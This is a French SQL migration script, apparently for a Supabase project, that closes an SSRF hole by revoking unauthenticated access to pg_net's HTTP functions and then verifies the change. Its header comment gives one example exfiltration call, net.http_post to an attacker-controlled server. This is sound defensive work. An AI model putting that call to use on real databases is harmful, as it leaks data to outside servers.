-- ═══════════════════════════════════════════════════════════════
-- À COLLER DANS LE SQL EDITOR DE SUPABASE
-- https://supabase.com/dashboard/project/bbzcuzqfgsdvjsymfwmr/sql/new
--
-- Ne peut PAS être appliqué depuis une connexion Postgres externe : les
-- fonctions `net.*` appartiennent à `supabase_admin`, et seul le
-- propriétaire peut révoquer un privilège. Un REVOKE lancé par `postgres`
-- via le pooler est ignoré en silence — l'ACL reste inchangée sans qu'aucune
-- erreur ne soit levée. Le SQL editor du dashboard, lui, s'exécute avec les
-- droits requis.
--
-- ─── PROBLÈME ───────────────────────────────────────────────────
-- L'extension pg_net permet à la base d'émettre des requêtes HTTP
-- SORTANTES. Elle est actuellement exécutable par `anon` — c'est-à-dire
-- SANS ÊTRE CONNECTÉ :
--
--   net.http_post  →  anon=true, authenticated=true
--   net.http_get   →  anon=true, authenticated=true
--   worker_restart →  anon=true, authenticated=true
--
-- C'est une SSRF depuis la base de données. Concrètement, un attaquant
-- non authentifié peut :
--   • exfiltrer des données vers un serveur qu'il contrôle
--     (`select net.http_post('https://son-serveur/', ...)`)
--   • atteindre des services internes injoignables depuis Internet
--   • perturber le worker réseau (worker_restart, wake), ce qui casserait
--     les notifications push et la libération des numéros SMS
--
-- ─── POURQUOI C'EST SANS RISQUE DE FERMER ───────────────────────
-- Les deux seuls appelants de net.http_* dans la base sont :
--   fn_push_on_notification      (SECURITY DEFINER, trigger)
--   trigger_sms_number_release   (SECURITY DEFINER)
--
-- Une fonction SECURITY DEFINER s'exécute avec les droits de SON
-- PROPRIÉTAIRE, pas de l'appelant : elles continueront d'émettre leurs
-- requêtes HTTP normalement. Vérifié avant rédaction de ce fichier.
--
-- Aucun appel direct à net.http_* depuis src/ ni server/.
-- ═══════════════════════════════════════════════════════════════


-- ── 1. Retirer l'accès aux rôles clients ──────────────────────
--
-- Le REVOKE doit viser PUBLIC en plus des rôles nommés : l'ACL de ces
-- fonctions est `=X/supabase_admin`, ce qui est un grant au pseudo-rôle
-- PUBLIC. Celui-ci englobe anon et authenticated sans les nommer, donc un
-- revoke ciblé sur eux seuls ne change rien (c'est ce piège qui a fait
-- échouer une première tentative).

revoke execute on all functions in schema net from public;
revoke execute on all functions in schema net from anon, authenticated;

-- Sans USAGE sur le schéma, aucune fonction n'y est atteignable même si un
-- grant subsistait quelque part. C'est la ceinture par-dessus la bretelle.
revoke usage on schema net from anon, authenticated;

-- Empêche la réapparition : une future fonction ajoutée à `net` (par une
-- mise à jour de l'extension) ne repartira pas exposée.
alter default privileges in schema net revoke execute on functions from public;
alter default privileges in schema net revoke execute on functions from anon, authenticated;


-- ── 2. Vérification — doit retourner 0 et false/false ─────────

select count(*) as fonctions_net_encore_ouvertes
from pg_proc p
join pg_namespace n on n.oid = p.pronamespace
where n.nspname = 'net'
  and (has_function_privilege('anon', p.oid, 'execute')
    or has_function_privilege('authenticated', p.oid, 'execute'));

select has_schema_privilege('anon', 'net', 'usage')          as anon_usage,
       has_schema_privilege('authenticated', 'net', 'usage')  as authenticated_usage;


-- ── 3. Confirmer que les appelants légitimes tournent toujours ──
--
-- Doit lister fn_push_on_notification et trigger_sms_number_release, tous
-- deux avec prosecdef = true. S'ils y sont, les notifications push et la
-- libération des numéros SMS continuent de fonctionner.

select p.proname, p.prosecdef as security_definer
from pg_proc p
join pg_namespace n on n.oid = p.pronamespace
where n.nspname = 'public' and p.prosrc ~* 'net\.http_'
order by p.proname;
